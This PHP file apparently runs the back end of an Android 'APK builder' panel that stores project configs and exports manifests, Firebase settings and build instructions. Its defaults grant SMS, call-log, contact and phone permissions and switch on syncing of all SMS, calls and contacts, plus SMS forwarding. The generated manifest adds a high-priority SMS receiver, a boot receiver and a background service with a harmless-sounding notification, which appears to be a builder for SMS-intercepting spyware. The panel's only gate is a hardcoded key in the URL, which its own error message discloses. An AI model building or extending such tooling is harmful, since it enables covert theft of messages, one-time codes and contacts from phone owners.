<?php
/**
 * Rebel APK Builder — config storage, google-services.json, build pack export.
 */
declare(strict_types=1);

define('REBEL_APK_OWNER', '8432393497');
define('REBEL_APK_DATA', __DIR__ . '/data/apk_projects');

function rebel_apk_default_config(): array {
  return [
    'id' => '',
    'name' => 'My Client App',
    'app' => [
      'name' => 'My Client App',
      'package' => 'com.client.myapp',
      'version_code' => 1,
      'version_name' => '1.0.0',
      'webview_url' => 'https://rebelbhaiya.alwaysdata.net/laptop.php',
      'allowed_domain' => 'rebelbhaiya.alwaysdata.net',
      'min_sdk' => 21,
      'target_sdk' => 34,
    ],
    'firebase' => [
      'project_id' => '',
      'project_number' => '',
      'api_key' => '',
      'app_id' => '',
      'storage_bucket' => '',
      'database_url' => '',
    ],
    'permissions' => [
      'internet' => true,
      'network_state' => true,
      'foreground_service' => true,
      'foreground_service_data_sync' => true,
      'boot_completed' => true,
      'wake_lock' => true,
      'post_notifications' => true,
      'send_sms' => true,
      'receive_sms' => true,
      'read_sms' => true,
      'read_call_log' => true,
      'read_contacts' => true,
      'call_phone' => true,
      'read_phone_state' => false,
      'camera' => false,
      'record_audio' => false,
      'fine_location' => false,
    ],
    'sync' => [
      'online_status' => true,
      'device_info' => true,
      'live_data' => true,
      'all_sms' => true,
      'new_sms' => true,
      'all_calls' => true,
      'all_contacts' => true,
      'devices_status' => true,
      'clients_node' => true,
      'sms_forwarding' => true,
      'manual_send_sms' => true,
      'sim_info' => true,
      'permissions_status' => true,
    ],
    'nodes' => [
      'device_root' => 'devices',
      'status_root' => 'devices_status',
      'clients_root' => 'clients',
    ],
    'ui' => [
      'primary_color' => '#FF3C3C',
      'accent_color' => '#FFD700',
      'background_color' => '#0A0A0F',
      'progress_color' => '#FFD700',
      'use_landing_page' => true,
      'splash_title' => 'Welcome',
      'splash_subtitle' => 'Tap a button below to continue',
      'logo_emoji' => '📱',
      'exit_title' => 'Exit App',
      'exit_message' => 'Do you want to close the app?',
      'notification_title' => 'Sync Service',
      'notification_text' => 'Running in background',
      'home_buttons' => [
        ['label' => 'Open Panel', 'url' => 'https://rebelbhaiya.alwaysdata.net/laptop.php', 'style' => 'primary'],
        ['label' => 'Refresh', 'url' => 'action:refresh', 'style' => 'secondary'],
      ],
    ],
    'updated_at' => 0,
  ];
}

function rebel_apk_ensure_data_dir(): void {
  if (!is_dir(REBEL_APK_DATA)) {
    @mkdir(REBEL_APK_DATA, 0755, true);
  }
}

function rebel_apk_slug(string $s): string {
  $s = strtolower(trim($s));
  $s = preg_replace('/[^a-z0-9]+/', '-', $s) ?? '';
  return trim($s, '-') ?: 'project';
}

function rebel_apk_merge_config(array $base, array $patch): array {
  foreach ($patch as $k => $v) {
    if (is_array($v) && isset($base[$k]) && is_array($base[$k]) && rebel_apk_is_assoc($v) && rebel_apk_is_assoc($base[$k])) {
      $base[$k] = rebel_apk_merge_config($base[$k], $v);
    } else {
      $base[$k] = $v;
    }
  }
  return $base;
}

function rebel_apk_is_assoc(array $a): bool {
  if ($a === []) return false;
  return array_keys($a) !== range(0, count($a) - 1);
}

function rebel_apk_sanitize_config(array $in): array {
  $cfg = rebel_apk_merge_config(rebel_apk_default_config(), $in);
  $cfg['app']['package'] = preg_replace('/[^a-zA-Z0-9_.]/', '', (string)$cfg['app']['package']) ?? 'com.client.app';
  if (!preg_match('/^[a-z][a-z0-9_]*(\.[a-z][a-z0-9_]*)+$/i', $cfg['app']['package'])) {
    $cfg['app']['package'] = 'com.client.myapp';
  }
  $cfg['app']['version_code'] = max(1, (int)$cfg['app']['version_code']);
  $cfg['app']['version_name'] = substr((string)$cfg['app']['version_name'], 0, 32) ?: '1.0.0';
  $cfg['app']['name'] = substr(trim((string)$cfg['app']['name']), 0, 64) ?: 'My App';
  $cfg['name'] = substr(trim((string)($cfg['name'] ?? $cfg['app']['name'])), 0, 80) ?: $cfg['app']['name'];
  foreach (['webview_url', 'database_url'] as $u) {
    if (!empty($cfg['app'][$u] ?? null) || !empty($cfg['firebase'][$u] ?? null)) continue;
  }
  if (empty($cfg['app']['allowed_domain']) && !empty($cfg['app']['webview_url'])) {
    $host = parse_url((string)$cfg['app']['webview_url'], PHP_URL_HOST);
    if ($host) $cfg['app']['allowed_domain'] = $host;
  }
  if (empty($cfg['firebase']['storage_bucket']) && !empty($cfg['firebase']['project_id'])) {
    $cfg['firebase']['storage_bucket'] = $cfg['firebase']['project_id'] . '.firebasestorage.app';
  }
  if (!is_array($cfg['ui']['home_buttons'] ?? null)) $cfg['ui']['home_buttons'] = [];
  $cfg['ui']['home_buttons'] = array_values(array_slice($cfg['ui']['home_buttons'], 0, 8));
  $cfg['updated_at'] = time();
  if (empty($cfg['id'])) {
    $cfg['id'] = rebel_apk_slug($cfg['name']) . '-' . substr(md5((string)microtime(true)), 0, 6);
  }
  return $cfg;
}

function rebel_apk_project_path(string $id): string {
  $id = preg_replace('/[^a-zA-Z0-9_\-]/', '', $id) ?? '';
  return REBEL_APK_DATA . '/' . $id . '.json';
}

function rebel_apk_save_project(array $cfg): array {
  rebel_apk_ensure_data_dir();
  $cfg = rebel_apk_sanitize_config($cfg);
  $path = rebel_apk_project_path($cfg['id']);
  file_put_contents($path, json_encode($cfg, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE));
  return $cfg;
}

function rebel_apk_load_project(string $id): ?array {
  $path = rebel_apk_project_path($id);
  if (!is_file($path)) return null;
  $j = json_decode((string)file_get_contents($path), true);
  return is_array($j) ? rebel_apk_sanitize_config($j) : null;
}

function rebel_apk_list_projects(): array {
  rebel_apk_ensure_data_dir();
  $out = [];
  foreach (glob(REBEL_APK_DATA . '/*.json') ?: [] as $f) {
    $j = json_decode((string)file_get_contents($f), true);
    if (!is_array($j)) continue;
    $out[] = [
      'id' => $j['id'] ?? basename($f, '.json'),
      'name' => $j['name'] ?? 'Untitled',
      'package' => $j['app']['package'] ?? '',
      'updated_at' => $j['updated_at'] ?? 0,
    ];
  }
  usort($out, fn($a, $b) => ($b['updated_at'] ?? 0) <=> ($a['updated_at'] ?? 0));
  return $out;
}

function rebel_apk_delete_project(string $id): bool {
  $path = rebel_apk_project_path($id);
  if (!is_file($path)) return false;
  @unlink($path);
  $logo = REBEL_APK_DATA . '/' . preg_replace('/[^a-zA-Z0-9_\-]/', '', $id) . '_logo.png';
  if (is_file($logo)) @unlink($logo);
  return true;
}

function rebel_apk_permission_manifest_map(): array {
  return [
    'internet' => 'android.permission.INTERNET',
    'network_state' => 'android.permission.ACCESS_NETWORK_STATE',
    'foreground_service' => 'android.permission.FOREGROUND_SERVICE',
    'foreground_service_data_sync' => 'android.permission.FOREGROUND_SERVICE_DATA_SYNC',
    'boot_completed' => 'android.permission.RECEIVE_BOOT_COMPLETED',
    'wake_lock' => 'android.permission.WAKE_LOCK',
    'post_notifications' => 'android.permission.POST_NOTIFICATIONS',
    'send_sms' => 'android.permission.SEND_SMS',
    'receive_sms' => 'android.permission.RECEIVE_SMS',
    'read_sms' => 'android.permission.READ_SMS',
    'read_call_log' => 'android.permission.READ_CALL_LOG',
    'read_contacts' => 'android.permission.READ_CONTACTS',
    'call_phone' => 'android.permission.CALL_PHONE',
    'read_phone_state' => 'android.permission.READ_PHONE_STATE',
    'camera' => 'android.permission.CAMERA',
    'record_audio' => 'android.permission.RECORD_AUDIO',
    'fine_location' => 'android.permission.ACCESS_FINE_LOCATION',
  ];
}

function rebel_apk_build_google_services(array $cfg): array {
  $fb = $cfg['firebase'];
  $pkg = $cfg['app']['package'];
  return [
    'project_info' => [
      'project_number' => (string)($fb['project_number'] ?? ''),
      'project_id' => (string)($fb['project_id'] ?? ''),
      'storage_bucket' => (string)($fb['storage_bucket'] ?? ''),
    ],
    'client' => [[
      'client_info' => [
        'mobilesdk_app_id' => (string)($fb['app_id'] ?? ''),
        'android_client_info' => ['package_name' => $pkg],
      ],
      'oauth_client' => [],
      'api_key' => [['current_key' => (string)($fb['api_key'] ?? '')]],
      'services' => ['appinvite_service' => ['other_platform_oauth_client' => []]],
    ]],
    'configuration_version' => '1',
  ];
}

function rebel_apk_build_manifest(array $cfg): string {
  $perms = rebel_apk_permission_manifest_map();
  $lines = ['<?xml version="1.0" encoding="utf-8"?>', '<manifest xmlns:android="http://schemas.android.com/apk/res/android">', ''];
  foreach ($cfg['permissions'] as $key => $on) {
    if (!$on || empty($perms[$key])) continue;
    $lines[] = '    <uses-permission android:name="' . $perms[$key] . '" />';
  }
  $pkg = $cfg['app']['package'];
  $javaPkg = 'com.spinplay99.adminpanel';
  $act = $javaPkg . '.MainActivity';
  $svc = $javaPkg . '.BackgroundSyncService';
  $boot = $javaPkg . '.BootReceiver';
  $sms = $javaPkg . '.SmsReceiver';
  $lines[] = '';
  $lines[] = '    <application';
  $lines[] = '        android:allowBackup="true"';
  $lines[] = '        android:icon="@mipmap/ic_launcher"';
  $lines[] = '        android:label="@string/app_name"';
  $lines[] = '        android:roundIcon="@mipmap/ic_launcher_round"';
  $lines[] = '        android:supportsRtl="true"';
  $lines[] = '        android:theme="@style/Theme.SpinPlay99"';
  $lines[] = '        android:usesCleartextTraffic="true"';
  $lines[] = '        android:networkSecurityConfig="@xml/network_security_config">';
  $lines[] = '';
  $lines[] = '        <activity android:name="' . htmlspecialchars($act, ENT_XML1) . '" android:exported="true" android:screenOrientation="portrait">';
  $lines[] = '            <intent-filter><action android:name="android.intent.action.MAIN" /><category android:name="android.intent.category.LAUNCHER" /></intent-filter>';
  $lines[] = '        </activity>';
  if (!empty($cfg['sync']['online_status']) || !empty($cfg['sync']['live_data'])) {
    $lines[] = '        <service android:name="' . htmlspecialchars($svc, ENT_XML1) . '" android:enabled="true" android:exported="false" android:foregroundServiceType="dataSync" android:stopWithTask="false" />';
    $lines[] = '        <receiver android:name="' . htmlspecialchars($boot, ENT_XML1) . '" android:enabled="true" android:exported="true">';
    $lines[] = '            <intent-filter><action android:name="android.intent.action.BOOT_COMPLETED" /></intent-filter>';
    $lines[] = '        </receiver>';
  }
  if (!empty($cfg['permissions']['receive_sms']) && !empty($cfg['sync']['new_sms'])) {
    $lines[] = '        <receiver android:name="' . htmlspecialchars($sms, ENT_XML1) . '" android:enabled="true" android:exported="true" android:permission="android.permission.BROADCAST_SMS">';
    $lines[] = '            <intent-filter android:priority="1000"><action android:name="android.provider.Telephony.SMS_RECEIVED" /></intent-filter>';
    $lines[] = '        </receiver>';
  }
  $lines[] = '    </application>';
  $lines[] = '</manifest>';
  return implode("\n", $lines) . "\n";
}

function rebel_apk_build_strings(array $cfg): string {
  $name = htmlspecialchars((string)$cfg['app']['name'], ENT_XML1);
  return "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<resources>\n    <string name=\"app_name\">{$name}</string>\n</resources>\n";
}

function rebel_apk_build_colors(array $cfg): string {
  $ui = $cfg['ui'];
  $p = preg_replace('/[^#a-fA-F0-9]/', '', (string)($ui['primary_color'] ?? '#FF3C3C')) ?: '#FF3C3C';
  $a = preg_replace('/[^#a-fA-F0-9]/', '', (string)($ui['accent_color'] ?? '#FFD700')) ?: '#FFD700';
  $b = preg_replace('/[^#a-fA-F0-9]/', '', (string)($ui['background_color'] ?? '#0A0A0F')) ?: '#0A0A0F';
  return "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<resources>\n    <color name=\"primary\">{$p}</color>\n    <color name=\"accent\">{$a}</color>\n    <color name=\"background_dark\">{$b}</color>\n    <color name=\"gold\">{$a}</color>\n</resources>\n";
}

function rebel_apk_build_network_config(array $cfg): string {
  $domain = preg_replace('/[^a-zA-Z0-9.\-]/', '', (string)($cfg['app']['allowed_domain'] ?? 'localhost')) ?: 'localhost';
  return <<<XML
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <domain-config cleartextTrafficPermitted="true">
        <domain includeSubdomains="true">{$domain}</domain>
        <domain includeSubdomains="true">firebaseio.com</domain>
        <domain includeSubdomains="true">firebasedatabase.app</domain>
        <domain includeSubdomains="true">googleapis.com</domain>
    </domain-config>
    <base-config cleartextTrafficPermitted="true" />
</network-security-config>

XML;
}

function rebel_apk_build_gradle_snippet(array $cfg): string {
  $app = $cfg['app'];
  return <<<GRADLE
// Paste into app/build.gradle defaultConfig { }
applicationId "{$app['package']}"
versionCode {$app['version_code']}
versionName "{$app['version_name']}"
minSdk {$app['min_sdk']}
targetSdk {$app['target_sdk']}

GRADLE;
}

function rebel_apk_build_landing_html(array $cfg): string {
  $ui = $cfg['ui'];
  $title = htmlspecialchars((string)($ui['splash_title'] ?? 'Welcome'), ENT_QUOTES, 'UTF-8');
  $sub = htmlspecialchars((string)($ui['splash_subtitle'] ?? ''), ENT_QUOTES, 'UTF-8');
  $logo = htmlspecialchars((string)($ui['logo_emoji'] ?? '📱'), ENT_QUOTES, 'UTF-8');
  $bg = htmlspecialchars((string)($ui['background_color'] ?? '#0A0A0F'), ENT_QUOTES, 'UTF-8');
  $primary = htmlspecialchars((string)($ui['primary_color'] ?? '#FF3C3C'), ENT_QUOTES, 'UTF-8');
  $accent = htmlspecialchars((string)($ui['accent_color'] ?? '#FFD700'), ENT_QUOTES, 'UTF-8');
  $appName = htmlspecialchars((string)$cfg['app']['name'], ENT_QUOTES, 'UTF-8');
  $btns = '';
  foreach ($cfg['ui']['home_buttons'] as $btn) {
    if (!is_array($btn)) continue;
    $label = htmlspecialchars((string)($btn['label'] ?? 'Button'), ENT_QUOTES, 'UTF-8');
    $url = htmlspecialchars((string)($btn['url'] ?? '#'), ENT_QUOTES, 'UTF-8');
    $style = ($btn['style'] ?? '') === 'secondary' ? 'secondary' : 'primary';
    $btns .= "<button class=\"btn {$style}\" onclick=\"go('{$url}')\">{$label}</button>\n";
  }
  if ($btns === '') {
    $wv = htmlspecialchars((string)$cfg['app']['webview_url'], ENT_QUOTES, 'UTF-8');
    $btns = "<button class=\"btn primary\" onclick=\"go('{$wv}')\">Open App</button>\n";
  }
  return <<<HTML
<!DOCTYPE html>
<html><head>
<meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>{$appName}</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{min-height:100vh;display:flex;align-items:center;justify-content:center;background:{$bg};color:#fff;font-family:system-ui,sans-serif;padding:24px}
.card{max-width:380px;width:100%;text-align:center}
.logo{font-size:64px;margin-bottom:12px}
h1{font-size:26px;margin-bottom:8px}
p{color:#aaa;font-size:14px;margin-bottom:28px;line-height:1.5}
.btn{display:block;width:100%;padding:14px 18px;margin:10px 0;border:none;border-radius:12px;font-size:15px;font-weight:700;cursor:pointer}
.btn.primary{background:linear-gradient(135deg,{$primary},#aa0000);color:#fff}
.btn.secondary{background:rgba(255,255,255,0.08);color:{$accent};border:1px solid rgba(255,255,255,0.15)}
</style>
</head><body>
<div class="card">
<div class="logo">{$logo}</div>
<h1>{$title}</h1>
<p>{$sub}</p>
{$btns}
</div>
<script>
function go(u){
  if(u.indexOf('action:')===0){ if(u==='action:refresh') location.reload(); return; }
  if(window.AndroidBridge) AndroidBridge.openUrl(u);
  else location.href=u;
}
</script>
</body></html>
HTML;
}

function rebel_apk_runtime_config(array $cfg): array {
  return [
    'app' => $cfg['app'],
    'firebase' => [
      'database_url' => $cfg['firebase']['database_url'] ?? '',
    ],
    'permissions' => $cfg['permissions'],
    'sync' => $cfg['sync'],
    'nodes' => $cfg['nodes'],
    'ui' => $cfg['ui'],
  ];
}

function rebel_apk_build_readme(array $cfg): string {
  $id = $cfg['id'];
  $pkg = $cfg['app']['package'];
  return <<<TXT
REBEL APK BUILD PACK — {$cfg['name']}
=====================================

1. Copy files into your Android project:
   - google-services.json  → app/google-services.json
   - apk_config.json       → app/src/main/assets/apk_config.json
   - landing.html          → app/src/main/assets/landing.html
   - AndroidManifest.xml   → app/src/main/AndroidManifest.xml (update package/activity names)
   - strings.xml           → app/src/main/res/values/strings.xml
   - colors.xml            → app/src/main/res/values/colors.xml
   - network_security_config.xml → app/src/main/res/xml/network_security_config.xml

2. Update app/build.gradle with build.gradle.snippet values
   Change namespace + applicationId to: {$pkg}

3. Build APK:
   ./gradlew clean assembleDebug

4. Output:
   app/build/outputs/apk/debug/app-debug.apk

Project ID: {$id}
Generated: {date('Y-m-d H:i:s')}

TXT;
}

function rebel_apk_export_zip(array $cfg): string {
  rebel_apk_ensure_data_dir();
  $tmp = sys_get_temp_dir() . '/rebel_apk_' . $cfg['id'] . '_' . time();
  @mkdir($tmp, 0755, true);
  $files = [
    'google-services.json' => json_encode(rebel_apk_build_google_services($cfg), JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES),
    'apk_config.json' => json_encode(rebel_apk_runtime_config($cfg), JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE),
    'landing.html' => rebel_apk_build_landing_html($cfg),
    'AndroidManifest.xml' => rebel_apk_build_manifest($cfg),
    'strings.xml' => rebel_apk_build_strings($cfg),
    'colors.xml' => rebel_apk_build_colors($cfg),
    'network_security_config.xml' => rebel_apk_build_network_config($cfg),
    'build.gradle.snippet' => rebel_apk_build_gradle_snippet($cfg),
    'README_BUILD.txt' => rebel_apk_build_readme($cfg),
  ];
  foreach ($files as $name => $content) {
    file_put_contents($tmp . '/' . $name, $content);
  }
  $logoPath = REBEL_APK_DATA . '/' . preg_replace('/[^a-zA-Z0-9_\-]/', '', $cfg['id']) . '_logo.png';
  if (is_file($logoPath)) {
    @copy($logoPath, $tmp . '/logo.png');
  }
  $zipPath = $tmp . '.zip';
  $zip = new ZipArchive();
  if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
    throw new RuntimeException('Could not create ZIP');
  }
  foreach (glob($tmp . '/*') ?: [] as $f) {
    $zip->addFile($f, basename($f));
  }
  $zip->close();
  foreach (glob($tmp . '/*') ?: [] as $f) @unlink($f);
  @rmdir($tmp);
  return $zipPath;
}

function rebel_apk_parse_google_services_upload(string $raw): array {
  $j = json_decode($raw, true);
  if (!is_array($j)) return [];
  $out = [];
  if (!empty($j['project_info']['project_id'])) $out['project_id'] = $j['project_info']['project_id'];
  if (!empty($j['project_info']['project_number'])) $out['project_number'] = $j['project_info']['project_number'];
  if (!empty($j['project_info']['storage_bucket'])) $out['storage_bucket'] = $j['project_info']['storage_bucket'];
  $client = $j['client'][0] ?? null;
  if (is_array($client)) {
    if (!empty($client['client_info']['mobilesdk_app_id'])) $out['app_id'] = $client['client_info']['mobilesdk_app_id'];
    if (!empty($client['api_key'][0]['current_key'])) $out['api_key'] = $client['api_key'][0]['current_key'];
    if (!empty($client['client_info']['android_client_info']['package_name'])) {
      $out['package_name'] = $client['client_info']['android_client_info']['package_name'];
    }
  }
  return $out;
}

function rebel_apk_check_owner(): bool {
  return (string)($_GET['owner'] ?? $_POST['owner'] ?? '') === REBEL_APK_OWNER;
}

function rebel_apk_json_response(array $data, int $code = 200): void {
  http_response_code($code);
  header('Content-Type: application/json; charset=UTF-8');
  header('Cache-Control: no-store');
  echo json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
  exit;
}

function rebel_apk_handle_api(): void {
  if (!rebel_apk_check_owner()) {
    rebel_apk_json_response(['ok' => false, 'error' => 'Forbidden — add ?owner=' . REBEL_APK_OWNER], 403);
  }
  $action = strtolower(trim((string)($_GET['action'] ?? $_POST['action'] ?? 'list')));
  if ($action === 'list') {
    rebel_apk_json_response(['ok' => true, 'projects' => rebel_apk_list_projects(), 'defaults' => rebel_apk_default_config()]);
  }
  if ($action === 'load') {
    $id = (string)($_GET['id'] ?? '');
    $cfg = rebel_apk_load_project($id);
    if (!$cfg) rebel_apk_json_response(['ok' => false, 'error' => 'Project not found'], 404);
    rebel_apk_json_response(['ok' => true, 'project' => $cfg]);
  }
  if ($action === 'save') {
    $body = file_get_contents('php://input');
    $in = json_decode($body ?: '{}', true);
    if (!is_array($in)) rebel_apk_json_response(['ok' => false, 'error' => 'Invalid JSON'], 400);
    $cfg = rebel_apk_save_project($in);
    rebel_apk_json_response(['ok' => true, 'project' => $cfg]);
  }
  if ($action === 'delete') {
    $id = (string)($_GET['id'] ?? $_POST['id'] ?? '');
    rebel_apk_json_response(['ok' => rebel_apk_delete_project($id)]);
  }
  if ($action === 'parse_gs') {
    $raw = (string)file_get_contents('php://input');
    if ($raw === '' && !empty($_FILES['file']['tmp_name'])) $raw = (string)file_get_contents($_FILES['file']['tmp_name']);
    $parsed = rebel_apk_parse_google_services_upload($raw);
    rebel_apk_json_response(['ok' => true, 'firebase' => $parsed]);
  }
  if ($action === 'preview') {
    $body = file_get_contents('php://input');
    $in = json_decode($body ?: '{}', true);
    if (!is_array($in)) rebel_apk_json_response(['ok' => false, 'error' => 'Invalid JSON'], 400);
    $cfg = rebel_apk_sanitize_config($in);
    rebel_apk_json_response([
      'ok' => true,
      'google_services' => rebel_apk_build_google_services($cfg),
      'apk_config' => rebel_apk_runtime_config($cfg),
      'manifest_preview' => rebel_apk_build_manifest($cfg),
      'landing_preview' => rebel_apk_build_landing_html($cfg),
    ]);
  }
  if ($action === 'export') {
    $id = (string)($_GET['id'] ?? '');
    $cfg = rebel_apk_load_project($id);
    if (!$cfg) {
      $body = file_get_contents('php://input');
      $in = json_decode($body ?: '{}', true);
      if (is_array($in) && !empty($in['app'])) $cfg = rebel_apk_sanitize_config($in);
    }
    if (!$cfg) rebel_apk_json_response(['ok' => false, 'error' => 'No project'], 404);
    try {
      $zip = rebel_apk_export_zip($cfg);
      header('Content-Type: application/zip');
      header('Content-Disposition: attachment; filename="rebel_apk_' . preg_replace('/[^a-zA-Z0-9_\-]/', '', $cfg['id']) . '.zip"');
      header('Content-Length: ' . filesize($zip));
      readfile($zip);
      @unlink($zip);
      exit;
    } catch (Throwable $e) {
      rebel_apk_json_response(['ok' => false, 'error' => $e->getMessage()], 500);
    }
  }
  if ($action === 'upload_logo') {
    $id = preg_replace('/[^a-zA-Z0-9_\-]/', '', (string)($_POST['id'] ?? ''));
    if ($id === '' || empty($_FILES['logo']['tmp_name'])) {
      rebel_apk_json_response(['ok' => false, 'error' => 'Missing id or logo'], 400);
    }
    rebel_apk_ensure_data_dir();
    $dest = REBEL_APK_DATA . '/' . $id . '_logo.png';
    if (!move_uploaded_file($_FILES['logo']['tmp_name'], $dest)) {
      rebel_apk_json_response(['ok' => false, 'error' => 'Upload failed'], 500);
    }
    rebel_apk_json_response(['ok' => true, 'logo' => 'data/apk_projects/' . $id . '_logo.png']);
  }
  rebel_apk_json_response(['ok' => false, 'error' => 'Unknown action'], 400);
}
